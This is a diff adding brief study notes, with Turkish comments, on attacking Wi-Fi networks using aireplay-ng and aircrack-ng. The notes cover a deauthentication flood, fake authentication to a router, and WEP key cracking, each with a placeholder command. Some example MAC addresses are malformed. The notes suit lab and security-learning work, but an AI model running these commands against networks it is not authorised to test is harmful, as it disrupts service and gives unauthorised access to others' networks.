@@ -1,0 +1,28 @@
+********************** DEAUTHENTICATION ATTACK = aireplay-ng **********************
+aireplay-ng --deauth <#packets> -a <AP(#acces points)(#bağlı oldugu modem)> -c <target> interface
+	ex: aireplay-ng --deauth 1000 -a 10:20:30:40 -c 00:AA:11:BB wlan0mon
+
+
+
+
+
+********************** FAKE AUTHENTICATION  **********************
+
+Modeme kendimizi tanıtırız bu komutla.
+-> aireplay-ng --fakeauth 0 -a <modem_mac> -h <Kali_mac> interface
+	ex: aireplay-ng --fakeauth 0 -a 33:CC:DS:BA -h 10:20:30:40 wlan0mon
+
+
+
+
+
+********************** WEP CRACK = aircrack-ng **********************
+
+airodump ile tarama bilgilerini bir cap dosyasına kaydettikten sonra o dosya ismi ile aircrack
+-> aircrack-ng <file_name>
+	ex: aircrack-ng test-01.cap
+
+# Wep cracking yapılırken veri akışı olması gerekir modemde.
+# Modemde veri akışı yoksa, sahte veri akışı sağlayıp kırabiliriz bir yukarıdaki yöntemle
+
+
